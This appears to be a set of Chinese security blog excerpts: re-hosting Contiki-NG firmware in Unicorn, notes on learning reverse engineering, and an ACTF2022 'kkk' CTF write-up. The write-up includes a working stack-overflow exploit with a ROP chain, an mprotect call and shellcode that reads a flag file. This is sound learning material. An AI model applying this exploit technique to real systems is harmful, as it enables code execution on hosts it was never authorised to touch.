[{"categories":["General"],"content":"本文记录如何用 Unicorn 模拟执行操作系统 Contiki-NG，并在上面复现并利用 CVE-2023-23609 的故事。 ","date":"2023-09-27","objectID":"/2023/09/re-host/:0:0","tags":null,"title":"Contiki Re-hosting 小记","uri":"/2023/09/re-host/"},{"categories":["General"],"content":"binary 分析 这个 binary 是一个固件（OS），并不是以前分析的应用程序，所以需要改变视角，对代码中出现的操作系统层面的工作要敏感点。 ARM Cortex-M3 boot 既然它是一个操作系统，那么在 boot 的时候就必须遵守 ARM Cortex-M3 平台的规则。复习一下系统课中学到的 x86 操作系统的启动过程：按下电源，BOIS 把硬盘中的启动扇区搬到内存的 0xFFFFFFF0 （或是更耳熟的 0x7C00）处，开始从这个地址执行。 在 ARM Cortex-M3 中，中断向量表会被映射到 0 地址处，boot 代码做了这些事情：去 0 地址处检索这个表，将第一个表项的值赋给 sp，第二个表项（也就是 reset handler）的值赋给 ip。这样的目的是 reset handler 可以用 C 写，因为在 reset handler 时栈已经初始化好了。参见 arm 官方 docs 与 what-is-the-booting-process-for-arm。 _text 起始处（0x00202000）就是中断向量表（中断向量表每个表项是什么，在平台上是有规定的），它的第一个表项是 _end，第二个表项是 reset_handler，印证了前面的说法。点开 reset_handler 发现它是这样的： void __noreturn reset_handler() { int v0; // r0 const char **v1; // r1 const char **v2; // r2 MEMORY[0x400D20B4] = 255; memcpy(\u0026ble_l2cap_tx_process, 0x214920, 0x362u); // data v0 = memset(\u0026rt_ticks_epoch, 0, 0x29EC); // bss main(v0, v1, v2); } 首先疑似是将什么寄存器设置为 255. 然后一个 memcpy 一个 memset。仔细观察可以发现，ble_l2cap_tx_process 其实是 .data 的起始处，rt_ticks_epoch 是 .bss 的起始处。所以其实是从 flash（映射到地址空间 0x214920） 里把数据拷贝到 .data 段，并且把 .bss 段清零。 mqa: 平时说的把代码烧进板子，其实是拷贝进 flash（外部存储器，类似于硬盘）。嵌入式系统比较神奇的一个点是，代码可以直接在 flash 里运行（可以想象成代码可以直接在硬盘里跑）。但是码能直接跑，数据段还是得放进内存里，所以需要把数据段从 flash 里拷贝进来。至于清零 .bss 段就更正常了，因为这就是操作系统该干的事儿，它不像 Linux 已经把页管理抽象好了，.bss 段分配出来就是零页。 真是豁然开朗，这样我们就走到了 main 函数。 main 接下来看看 main 里干了啥，首先就是一堆不明所以的硬件与软件初始化过程。 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { uip_ds6_addr_t *link_local; // r4 int v4; // r4 platform_init_stage_one(); clock_init(); rtimer_init(); process_init(); process_start(\u0026etimer_process, 0); ctimer_init(); watchdog_init(); energest_init(); stack_check_init(); platform_init_stage_two(); queuebuf_init(); netstack_init(); node_id_init(); ... } 没有太多说法，稍微说说知道的东西（主要是知道的东西也不多）。watchdog 是硬件。然后 platform_init_stage_one 点进去有一个 soc_init，自如其名就是 System of Chips 初始化。 void soc_init() { nvic_init(); ioc_init(); sys_ctrl_init(); clock_init(); lpm_init(); rtimer_init(); gpio_hal_init(); } 里面 nvic_init 是把中断向量表头赋值给一个 NVIC 寄存器（内存映射到了 0xE000ED08），具体是哪个寄存器都可以在 CorTex-M3 手册里查到。 void nvic_init() { MEMORY[0xE000ED08] = text; } ioc 不知道是什么的缩写，lpm 不知道是什么的缩写，gpio_hal 指的是 gpio 硬件抽象层（一般是不同硬件厂商造出来的一层抽象，使得上层接口一致，并无需关心下层硬件细节）。gpio 是什么不知道。 反正一系列初始化以后，固件打印出版本信息 Starting Contiki-NG-release/v4.9-11-gfd7139694 等。然后来分析一下它执行了哪些东西。 最开始的一个 process_start 启动的是 tcpip_process。后续 autostart_start 挨个儿启动的 autostart_processes 列表里的进程，实际上里面就一个 hello_world_process。这两个 process 都由一个结构体表示，成员变量里记录了 entry point，对应地址就是要执行的函数，具体如下，不明所以。 unsigned __int8 __fastcall process_thread_hello_world_process(pt *process_pt, process_event_t ev, process_data_t data) { if ( !process_pt-\u003elc ) { etimer_set(\u0026timer_0, 0x500u); goto LABEL_6; } if ( process_pt-\u003elc == 60 ) { if ( !etimer_expired(\u0026timer_0) ) return 1; etimer_reset(\u0026timer_0); LABEL_6: puts(\"Hello, world\"); process_pt-\u003elc = 60; return 1; } process_pt-\u003elc = 0; return 3; } unsigned __int8 __fastcall process_thread_tcpip_process(pt *process_pt, process_event_t ev, process_data_t data) { if ( !process_pt-\u003elc ) { tcpip_event = process_alloc_event(); etimer_set(\u0026periodic_0, 0x40u); uip_init(); init_1(); goto LABEL_4; } if ( process_pt-\u003elc == 833 ) { eventhandler(ev, data); LABEL_4: process_pt-\u003elc = 833; return 1; } process_pt-\u003elc = 0; return 3; } 启动完这两个 process 之后，一个 While 循环里开始 process_run。注意 start 和 run 的区别，start 可以认为只是把 process 结构、资源准备好，而 run 才是真正地运行（简单来说就是修改 process 状态，让它跑起来），所以既然它是一个操作系统，那么这个 process_run 里理应出现它的调度算法。果然： int process_run() { if ( poll_requested ) do_poll(); do_event(); return poll_requested + nevents; } do_poll 里去遍历 process_list，根据前面的猜测那么这个 process_list 理应是在前面启动的过程中构建的。所以就是不停地遍历所有 process，看看有没有哪个需要启动了。如果有，那就 call_process。do_event 里也是类似。 void do_poll() { process *i; // r4 poll_requested = 0; for ( i = process_list; i; i = i-\u003enext ) { if ( i-\u003eneedspoll ) { i-\u003estate = 1; i-\u003eneedspoll = 0; call_process(i, 0x82u, 0); } } } 总之是走到了 call_process，这里面一个大大地函数指针运行标志着我们分析的结束。 void __fastcall call_process(process *p, process_event_t ev, process_data_t data) { int v4; // r5 unsigned __int8 (*thread)(pt *, process_event_t, process_data_t); // r3 if ( (p-\u003estate \u0026 1","date":"2023-09-27","objectID":"/2023/09/re-host/:1:0","tags":null,"title":"Contiki Re-hosting 小记","uri":"/2023/09/re-host/"},{"categories":["General"],"content":"Re-host 理解够了接下来才真正开始干活儿，我们接下来的工作重心是用 Unicorn 把这个 firmware 跑起来。 准备工作 extract raw binary 众所周知，一个 ELF 并不是任何段都是有用的。特别是在嵌入式的场景下，存储空间寸土寸金，把整个 ELF 全部烧进板子属实浪费。在这个场景下，感觉把 .text 和 .data 提出来就足够 Unicorn 去模拟了。 x1do0@ubt2022:~/firmware_fuzz/labs/day6$ arm-none-eabi-objcopy -O binary ./hello-world.elf hello-world.bin x1do0@ubt2022:~/firmware_fuzz/labs/day6$ ls -la total 812 drwxrwxr-x 2 x1do0 x1do0 4096 Sep 28 11:29 . drwxrwxr-x 5 x1do0 x1do0 4096 Sep 26 18:47 .. -rwxrwxr-x 1 x1do0 x1do0 516096 Sep 28 11:29 hello-world.bin -rwxrwxr-x 1 x1do0 x1do0 730104 Sep 28 11:26 hello-world.elf 可以 xxd 对比看看提取出来的 binary 长什么样：开头就是 .text 段，而 .data 段被放在了 0x00012920 处。这里很自然会想到一个问题，这两个段的相对位置相对于 ELF 来说显然发生了改变。那么代码中访问 .data 时寻址岂不是失效了？前面提到 .data 是在 reset_handler 中拷贝的，而这里一个神奇的地方就在于，拷贝的地址 0x214920 与 .text 段（0x202000开始）之间正好差了 0x00012920，使得在模拟中只要正确定位了代码段，那么就不会出现任何问题。这到底是巧合还是必然？ memcpy(\u0026ble_l2cap_tx_process, 0x214920, 0x362u); ARM Cortex-M3 memory layout 清清楚楚，明明白白：memory map 其中 Peripheral 区域就是 MMIO，一般来说我们只需要在 Unicorn 中 map 0 - 0x60000000 和 0xE0000000 以上的区域。 如何模拟中断 Unicorn 是基于 QEMU 开发的，但前者将 QEMU 的中断支持完全去掉了，所以我们需要用软件来模拟中断响应的过程。简单来想，当代码模拟执行到要发生中断的位置处时，保存寄存器，跳到对应中断函数，执行完恢复寄存器，跳回中断发生处接着执行即可。 Unicorn 模拟中断的过程疑似是大有门道，但暂且先抱着能用就行的心态继续下去，不深入研究了。 如何模拟硬件 一个固件上的硬件，比如传感器，收到了数据，它要从 MMIO 寄存器里读。如何模拟 MMIO 寄存器读呢？我们也简单地想，每当读某些地址时，主动 mem_write 一个随机值，模拟硬件数据就好了吧？ 如何跳过某些函数？ 在 hook code 的时候发现，有些函数异常烦人，比如 fade 函数中的循环在被 hook 上之后使得整个模拟过程变得究极慢，而显然这并不是一个有什么作用的函数，所以得想个办法在模拟的时候直接将其跳过。 void __fastcall fade(leds_mask_t l) { int j; // r5 int v3; // r4 volatile int i; // [sp+4h] [bp-14h] volatile int ia; // [sp+4h] [bp-14h] for ( j = 0; j \u003c 800; ++j ) { if ( j \u003e 400 ) v3 = 800 - j; else v3 = j; leds_on(l); for ( i = 0; i \u003c v3; ++i ) ; leds_off(l); for ( ia = 0; 400 - v3 \u003e ia; ++ia ) ; } } 其实思路也非常简单，在开始模拟之前把它 patch 掉让它提前返回就行了。观察函数体，进去的时候寄存器入栈，下拉 SP，出来的时候上拉 SP 并复原寄存器。 .text:00210924 ; void __fastcall fade(leds_mask_t l) .text:00210924 fade ; CODE XREF: platform_init_stage_two+3C↑p .text:00210924 ; platform_init_stage_three+20↑p ... .text:00210924 .text:00210924 i = -0x14 .text:00210924 .text:00210924 l = R0 ; leds_mask_t .text:00210924 PUSH {R4-R6,LR} .text:00210926 SUB SP, SP, #8 ... .text:0021097C ADD SP, SP, #8 .text:0021097E POP {R4-R6,PC} 那么很自然的，我们把 0x210926 处的代码直接修改为 POP {R4-R6,PC} 即可。 mu.mem_write(0x210926, b\"\\x70\\xBD\") # bypass fade, POP {R4-R6,PC} 解决不了问题，就消灭提出问题的人！ 模拟程序，并产生一个 reset 中断 我们先模拟执行到 0x210768 处。思路已经十分清晰了，直接上码。 from unicorn import * from unicorn.arm_const import * from pwn import * from scapy.all import * import random context.arch = 'arm' REGION_START = 0 REGION_SIZE = 0x60000000 ROM_BASE = 0x202000 def hook_code(mu, address, size, user_data): pass interrupted = False def hook_block(mu, address, access, user_data): global interrupted print(f\"[hook block] 0x{address:x}, {access}, {user_data}\") # interrupt if (address == 0x203D5A and not interrupted): print(\"Interrupted...\") sleep(3) interrupted = True # save registers ptrs = {} for reg in regs: ptrs[reg] = mu.reg_read(reg) pc = mu.reg_read(UC_ARM_REG_PC) # execute functions interrupt_no = 2 # reset interrupt_func = u32(mu.mem_read(ROM_BASE + 4 * (interrupt_no - 1), 4)) mu.emu_start(interrupt_func, 0x00210768) exit() # restore for reg in regs: mu.reg_write(reg, ptrs[reg]) # how to deal with stack? mu.reg_write(UC_ARM_REG_PC, pc+2) pass def hook_mem_unmapped(mu, access, address, length, value, user_data): print(f\"[hook_mem_unmapped] {access}, {address:x}, {length}, {value}, {user_data}\") pass def hook_mem_read(mu, access, address, length, value, user_data): # print(f\"[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}\") if length == 4: r = random.choice([0, 1, 0x4000000]) # to bypass sys_ctrl_init, random_init # print(f\"content: {mu.mem_read(address, 4)}, ready to write random: {r}\") mu.mem_write(address, p32(r)) regs = [UC_ARM_REG_SP, UC_ARM_REG_R0, UC_ARM_REG_R1, UC_ARM_REG_R2, UC_ARM_REG_R3, UC_ARM_REG_R12, UC_ARM_REG_LR] def main(): mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # memory regions mu.mem_map(REGION_START, REGION_SI","date":"2023-09-27","objectID":"/2023/09/re-host/:2:0","tags":null,"title":"Contiki Re-hosting 小记","uri":"/2023/09/re-host/"},{"categories":["General"],"content":"结束了吗？ 本文记录了初次使用 Unicorn，并在没有任何硬件的情况下对某物联网 OS 固件进行软件模拟，并复现某个较易利用的漏洞的过程。笔者对自己写的模拟代码相当不满意，其中也有不少地方可以深究。但目前打算暂放一下，希望几个月后回顾这篇文章时会觉得漏洞百出，依托答辩。收工！ ","date":"2023-09-27","objectID":"/2023/09/re-host/:3:0","tags":null,"title":"Contiki Re-hosting 小记","uri":"/2023/09/re-host/"},{"categories":["General"],"content":"年初 SECCON CTF 22 final 上第二天出了一道 KoH 题：给定 binary 要求写出源码，判定标准为编译后与目标 binary 的 diff，越小则分数越高。每一小时更换一门语言，从 c,c++ 到 d, go, web assembly 等等。我读完题目就放弃了因为我知道我的逆向水平就是依托答辩，而队友也不负众望基本一整天都在爆杀全场。我在崇拜之余不由得思考起一个问题，逆向应该怎么学？ 这是一个困扰已久的问题，我在本科时期曾想过在 CTF 赛事中参与逆向题，但基本不得要领。我也直球问过别人：逆向该怎么学？ 本科某同届逆向大哥（与某学长）：多刷题就完事了 L3H Sec 某逆向大哥：多看就完事了 我能理解他们想表达什么，但这些回答显然对我毫无帮助（（ ","date":"2023-05-04","objectID":"/2023/05/rev_main/:0:0","tags":null,"title":"逆向方法论","uri":"/2023/05/rev_main/"},{"categories":["General"],"content":"what I want 我仔细考虑了一下逆向能做的事，比如写外挂等，我发现我并不是很喜欢逆向。那我想要的是什么呢？明确目标以后我承认有点标题党了，毕竟对于更喜欢漏洞利用、漏洞分析的我来说，我的“逆向”目标其实相当可笑：如何能在反编译工具中看懂程序？这里的程序基本没有复杂逻辑，也不需要选手的逆向技巧，而且程序一般也是带符号的。 比如，一个 c++ binary 放进 IDA 里我可能完全看不懂程序逻辑，各种奇奇怪怪的东西让人眼花缭乱，一个栈溢出我都可能发现不了。 ","date":"2023-05-04","objectID":"/2023/05/rev_main/:1:0","tags":null,"title":"逆向方法论","uri":"/2023/05/rev_main/"},{"categories":["General"],"content":"do shit now 那么我应该怎么做呢？我试图总结出一套不值一提的逆向方法论，一个我需要去 check 的 list，这样在接触到一门新语言时对着 list 一条一条看，这样至少可以避免遗漏关键点，也能让我有一种“哎呀我把这个 list 上的东西都弄完那这个 blabla 语言的逆向我就会了”的感觉。最主要的是，在方法论的运用过程中这个 list 会被不断扩充、完善，进而更好地学习下一门语言的逆向。 学习的核心思路是：逆逆向，即正向。这种学习方法我还没想到过，在网上闲逛时受这篇文章启发才恍然大悟，决定造一个让自己学习体验更佳的方法论。学习逆向的过程中，不是像以前一样在 IDA 中苦苦尝试从 binary 到 source code 建立映射，而却是去从 source code 到 binary 建立映射。 对于每一门语言，把握以下这些关键点，尝试去自己写源码、编译，放进 IDA 里看。 main 函数前发生了什么？ main 函数 各种数据类型怎么存的？ int, float, string, array global, local 类型转换？ 更多数据类型？ vec set 控制流？ 库函数怎么调用的？ 打印函数？输入函数？ .plt? .got? … 自己写的函数怎么调用的？ 分支，循环？ … 该语言的其他特性 … 或者可以说，对于新造的一门语言，你要去为它写一个 doc，你会去把握哪些关键点。原来学习逆向的最佳方式，反而是正向？ ","date":"2023-05-04","objectID":"/2023/05/rev_main/:2:0","tags":null,"title":"逆向方法论","uri":"/2023/05/rev_main/"},{"categories":["PWN"],"content":"Info\r\rYet another signin (kernel) pwn challenge. 4 Solved\r\r 感谢 Nu1L 和 AAA 的几位师傅分享思路。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:0:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"Preparation 不知道怎么调 qemu-system 内跑的用户态程序。明明 qemu-system 不像 qemu-user 一样与 elf 公用同一片内存，但不知道为什么 parser 加载地址对不上。 建议 host 调试,不然只能下绝对地址断点。 尝试直接在 host 里调。kkk.ko 与本机 kernel 版本不同，不能直接挂上来。所以自己造一个 fake module #include \u003clinux/miscdevice.h\u003e#include \u003clinux/fs.h\u003e#include \u003clinux/kernel.h\u003e#include \u003clinux/module.h\u003e #include \u003clinux/ioctl.h\u003e#include \u003clinux/timer.h\u003e#include \u003clinux/workqueue.h\u003e#include \u003clinux/types.h\u003e#include \u003clinux/crypto.h\u003e#include \u003clinux/string.h\u003e#include \u003clinux/slab.h\u003e#include \u003clinux/mutex.h\u003e#include \u003clinux/spinlock.h\u003e #include \u003clinux/scatterlist.h\u003e // #define DEBUG /* ioctl commands */ #define KKK_IOCTL_ADD _IO('k', 100) #define KKK_IOCTL_UPDATE _IO('k', 103) #define KKK_IOCTL_DUMP _IO('k', 105) #define KKK_IOCTL_LAUNCH _IO('k', 107) #define KKK_IOCTL_DETACH _IO('k', 109) /* empty handler, we just need ioctl */ static int kkk_open(struct inode *inodep, struct file *filp) { printk(\"kkk_open()\\n\"); return 0; } static int kkk_close(struct inode *inodep, struct file *filp) { printk(\"kkk_close()\\n\"); return 0; } static ssize_t kkk_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos) { printk(\"kkk_write()\\n\"); return len; } static ssize_t kkk_read(struct file *file, char __user *buf, size_t len, loff_t *ppos) { printk(\"kkk_read()\\n\"); return len; } static long kkk_internal_ioctl(struct file *filp, unsigned int cmd, unsigned long value) { printk(\"kkk_internal_ioctl()\\n\"); switch(cmd) { case KKK_IOCTL_ADD: { printk(\"KKK_IOCTL_ADD\\n\"); break; } case KKK_IOCTL_UPDATE: { printk(\"KKK_IOCTL_UPDATE\\n\"); break; } case KKK_IOCTL_DUMP: { printk(\"KKK_IOCTL_DUMP\\n\"); break; } case KKK_IOCTL_LAUNCH: { printk(\"KKK_IOCTL_LAUNCH\\n\"); break; } case KKK_IOCTL_DETACH: { printk(\"KKK_IOCTL_DETACH\\n\"); break; } default: printk(\"Wrong choice\\n\"); break; } return 0; } static long kkk_unlocked_ioctl(struct file *file, unsigned int cmd, unsigned long value) { return kkk_internal_ioctl(file, cmd, value); } static long kkk_compat_ioctl(struct file *file, unsigned int cmd, unsigned long value) { return kkk_internal_ioctl(file, cmd, value); } static const struct file_operations kkk_fops = { .owner = THIS_MODULE, .write = kkk_write, .read = kkk_read, .open = kkk_open, .release = kkk_close, .unlocked_ioctl = kkk_unlocked_ioctl, .compat_ioctl = kkk_compat_ioctl, .llseek = no_llseek }; struct miscdevice kkk_device = { .minor = MISC_DYNAMIC_MINOR, .name = \"kkk\", .fops = \u0026kkk_fops, }; static int __init kkk_init(void) { int error; error = misc_register(\u0026kkk_device); if (error) { pr_err(\"misc_register fail\\n\"); return error; } return 0; } static void __exit kkk_exit(void) { misc_deregister(\u0026kkk_device); } module_init(kkk_init); module_exit(kkk_exit); MODULE_DESCRIPTION(\"kkk fake driver\"); MODULE_AUTHOR(\"x1do0\"); MODULE_LICENSE(\"GPL\"); 驱动的 Makefile 用最基础的就行。 ifneq ($(KERNELRELEASE),) obj-m:=kkk.o else KDIR :=/lib/modules/$(shell uname -r)/build PWD :=$(shell pwd) all: make -C $(KDIR) M=$(PWD) modules clean: rm -f *.ko *.o *.mod.o *.symvers *.cmd *.mod.c *.order endif make 以后 insmod 挂上来就能跑 or 调试 parser 了。 进 su 以后 python 环境会变，添加 sys.path 才行，不然 pwntools 库都找不到，参考这篇。 进 su 以后直接在脚本里 gdb.attach 会挂不上 gdb，提示 ptrace not permitted。参考这篇，尝试过改 /proc/sys/kernel/yama/ptrace_scope 也不行。。 只有先跑脚本，再开一个 su，然后 gdb attach pid 挂上去。。在 exp 中写个等待用户输入。 ### input() # wait for input, attach gdb at this time ### 然后乘机跑 debug.sh [pid]，挂上 gdb。 #!/bin/sh gdb -q attach \"$1\" -ex 'b *0x401B22' 然后就能调了。。实际上 parser 还开了 sandbox，在 prepare 中。如果可以顺利跑起来的话直接 seccomp dump 也能发现。 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015 0005: 0x15 0x08 0x00 0x00000000 if (A == read) goto 0014 0006: 0x15 0x07 0x00 0x00000001 if (A == write) goto 0014 0007: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0014 0008: 0x15 0x05 0x00 0x00000003 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:1:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"step1 在这一部分，我们会攻破用户态程序 parser，拿到 shell or 实现任意代码执行。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:2:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"协议逆向 对协议进行逆向，结果大概是这个样子 packet_hdr 头部 0x30 字节，程序用 get_packet_hdr 来赋值。它包含了这些信息和要求 packet_hdr[:4] 需要是 p32(0xAAA) packet_hdr[4:8] 需要是 p32(1) packet_hdr[16:20] 是 size 域，size \u003e 0x877 则报错 packet_hdr[20:24] 是校验和，会过一个 crc32 segment_hdr 紧跟着是一个 0x8 字节的头部，赋值在 get_segements 函数中。它包含了这些信息 segment_hdr[:4] 标识了后续 segment 的段数 cnt，cnt \u003e 7 or cnt \u003c= 1 则报错 segment_hdr[4:8] 是另一个大小域 size2，size2 + 0x38 \u003e size 则报错 segment 然后就是 cnt 个 segment，每个 segment 包含了这些信息 segment[4:8] 是这个 segment 内容的大小域 con_size，con_size \u003e 0x100 则报错。它会过一个 0x20 字节向上对齐的操作。 segment[8:] 是用户随意输入的内容，大小为 con_size ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:2:1","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"demo CRC的值其实可以每次调试拿到，比如这里的 0x796f15c9。可以试一下这个 demo exp io = process(\"./parser\") # input() # gdb.attach(io, \"b *0x401B22\") io.recvuntil(\"ENTER YOUR PACKET \u003e \") ### pakcet_hdr 0 - 0x30 packet_hdr = p32(0xAAA) + p32(1) packet_hdr += p64(0) packet_hdr += p32(0x877) # a1[4] packet_hdr += p32(0x796f15c9) # crc32 packet_hdr = packet_hdr.ljust(0x30, b'\\x00') SEND(io, packet_hdr) ### segment_hdr 0x30 - 0x38 cnt = 2 segment_hdr = p32(cnt) + p32(0) # a1[:30] SEND(io, segment_hdr) ### segment 0x38 - for i in range(cnt): ### header 8 bytes size = 0x100 segment = p32(0) + p32(size) SEND(io, segment) ### content size bytes content = b'a'*0x100 SEND(io, content) io.interactive() 可以看到确实和 kkk.ko 交互了，交互顺序与程序一致。证明协议逆向没什么问题。 root@x1do0:/home/x1do0/linux_share/actf/kkk# dmesg -c [61111.167379] kkk_open() [61111.173754] kkk_internal_ioctl() [61111.173754] KKK_IOCTL_ADD [61111.173755] kkk_internal_ioctl() [61111.173755] KKK_IOCTL_LAUNCH [61111.173756] kkk_internal_ioctl() [61111.173756] KKK_IOCTL_DUMP [61111.173766] kkk_internal_ioctl() [61111.173769] KKK_IOCTL_DETACH [61116.897292] kkk_close() for ( i = 1; ; ++i ) { result = i; if ( *v11 \u003c= i ) break; next_type = *next_ptr; next_size = align(next_ptr[1]); next_con = size_shift((__int64)next_ptr, 8u); cur_size = align(*(unsigned int *)(v10 + 4)); cur_con = size_shift(v10, 8u); add(cur_con, cur_size, next_con, next_size, next_type);// 0x6B64 add launch(i - 1); // 0x6B6B Launch next_con_2 = size_shift((__int64)next_ptr, 8u); cur_con_2 = size_shift(v10, 8u); show(i - 1, cur_con_2, next_con_2); // 0x6B69 Dump release(i - 1); // 0x6b6D detach } ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:2:2","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"漏洞 在 get_segements 中读取 segment 内容的大小域时，只需要 int 值不大于 0x100 就行了。但是在后续读取以及 parse_and_run 解析时会把这个域 解析成 unsigned int。所以如果一开始 size 赋值为负数，它能绕过检测，并且在后续解析成一个巨大的 unsigned int 造成溢出。 unsigned int v2; __int64 v4; // [rsp+220h] [rbp-40h] for ( i = 0; i \u003c v5; ++i ) { v4 = size_shift((__int64)v6, v8 + 8); read_through_base64(v4, 8u); if ( *(int *)(v4 + 4) \u003e 0x100 ) return 0xFFFFFFFFLL; // ... v2 = *(_DWORD *)(v4 + 4); v3 = size_shift(v4, 8u); read_through_base64(v3, v2); // int -\u003e unsigned int //... ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:2:3","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"利用 于是可以在 main 中 v4 变量造成栈溢出，没开 canary。实际上如果 cnt 为 1，它虽然不会走到 parse_and_run 但是已经导致了栈溢出。当然，输入多个 segment 也行。 PoC 如下。至此，我们达到了用户态任意代码执行的目标。 import base64 import sys sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages') sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg') print(sys.path) from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] def SEND(io, con): io.send(base64.b64encode(con)) io = process(\"./parser\") # input() # gdb.attach(io, \"b *0x401B22\") for i in range(15): io.sendafter(\"ENTER YOUR PACKET \u003e \", '\\n') io.recvuntil(\"ENTER YOUR PACKET \u003e \") ### pakcet_hdr 0 - 0x30 packet_hdr = p32(0xAAA) + p32(1) packet_hdr += p64(0) packet_hdr += p32(0x877) # a1[4] packet_hdr += p32(0x796f15c9) # crc32 packet_hdr = packet_hdr.ljust(0x30, b'\\x00') SEND(io, packet_hdr) ### segment_hdr 0x30 - 0x38 cnt = 1 segment_hdr = p32(cnt) + p32(0) # a1[:30] SEND(io, segment_hdr) ### segment 0x38 - ### header 8 bytes size = 0xf0000000 segment = p32(0) + p32(size) SEND(io, segment) ### content size bytes # 0x00000000004006a6 : pop rdi ; ret # 0x000000000045c139 : pop rdx ; pop rsi ; ret # 0x00000000004005af : pop rax ; ret # 0x00000000004859c5 : syscall ; ret # mprotect(buf, 0x1000, 4|2|1) buf_addr = 0x6DB4A0 rop = flat(0x00000000004006a6, buf_addr\u0026(~0xfff), 0x000000000045c139, 7, 0x1000, 0x00000000004005af, 10, 0x00000000004859c5) # read(0, buf, 0x100) rop += flat(0x00000000004006a6, 0, 0x000000000045c139, 0x100, buf_addr, 0x00000000004005af, 0, 0x00000000004859c5) # ret2shellcode rop += p64(buf_addr) content = b'a'*0x848 + rop SEND(io, content) shellcode = asm(shellcraft.open(\"flag\")) shellcode += asm(shellcraft.read('rax', buf_addr+0x200, 0x20)) shellcode += asm(shellcraft.write(1, buf_addr+0x200, 0x20)) io.sendline(shellcode) # 0x7ffdbdb52b80 # return at 0x7ffdbdb533c8 io.interactive() ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:2:4","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"step2 到现在为止，我们实现了任意代码执行，可以和 kkk.ko 驱动随意交互。在这一部分，我们将攻破内核态驱动，拿到 root 权限。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:3:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"驱动逆向 对着 kkk.ko 看，可以明确协议的更多域，比如： segment[1] 是 enc segment[2] 是 kkk_type，enum 型，标识了 kkk.ko 处理的加密方案。 但再去看这个协议并没有多少意义，因为我们已经可以直接用 ioctl 去和驱动交互了。有以下这些交互选项 open 初始化，把 filep 的 private_data 赋值成自建的结构体 kkk_desc，这个结构体里有个 kkk_obj 指针数组 close 退出，释放、清零指针。 0x6B64 add 这里 add 送入的参数 con 是以结构体 kkk_ioctl_add_arg 形式，有如下域 struct kkk_ioctl_add_arg { enum kkk_type type; int enc; struct kkk_pack key; struct kkk_pack data; }; /* core data strcutres */ struct kkk_pack { unsigned int size; void *ptr; // user space pointer }; 在 add 操作中，会找到 filep 的 private_data，选最小 idx 的 kkk_obj 指针数组来分配。分配方式很简单，为该指针分配 kkk_obj 结构体大小加上 keypack-\u003esize 与 datapack-\u003esize 大小的空间。以参数 con 各个域来填充该 kkk_obj 结构体，同时会把 keypack-\u003eptr 与 datapack-\u003eptr 具体内容拷贝到后方区域。其中 handler 是 type 指定的加密算法的函数指针。 struct kkk_obj { struct kkk_pack keypack; struct kkk_pack datapack; int id; int enc; int (*handler)(struct kkk_obj *); }; 0x6B67 update update 送入参数 con 是以结构体 kkk_ioctl_other_arg 形式，有如下域 struct kkk_ioctl_other_arg { int id; struct kkk_pack key; struct kkk_pack data; }; 在 update 操作中，会根据 con 的内容修改 kkk_obj[id] 对应的 keypack-\u003eptr 与 datapack-\u003eptr 内容（不能改 size）。 0x6B69 dump dump 送入参数 con 也是以结构体 kkk_ioctl_other_arg 形式。它会将 kkk_obj[id] 对应的 keypack-\u003eptr 与 datapack-\u003eptr 内容覆盖到 con 的 keypack-\u003eptr 与 datapack-\u003eptr 指针所指内容中。（size 域同样无效） 0x6B6B launch 传入参数同样是以结构体 kkk_ioctl_other_arg 形式。会执行 kkk_obj[id]-\u003ehandler(kkk_obj[id]) 0x6B6D detach 参数同样是以结构体 kkk_ioctl_other_arg 形式。会 kfree(kkk_obj[id]) 并清零指针。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:3:1","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"加密函数 上述交互看上去并没有什么问题，detach 里没有 uaf，update 和 dump 因为 size 域根本无效所以也没有越界。所以来接着看看 handler 指向的各个加密函数。具体来说，handler 是根据 type 如下赋值的，可见一共有 4 中加密方式。 // add 功能中 handler = handlers[type \u0026 3]; .data:00000000000011E0 handlers dq offset kkk_des_cb ; DATA XREF: kkk_unlocked_ioctl+1E0↑r .data:00000000000011E8 dq offset kkk_tdes_cb .data:00000000000011F0 dq offset kkk_aes128_cb .data:00000000000011F8 dq offset kkk_aes256_cb 这 4 种加密函数做的事都是把 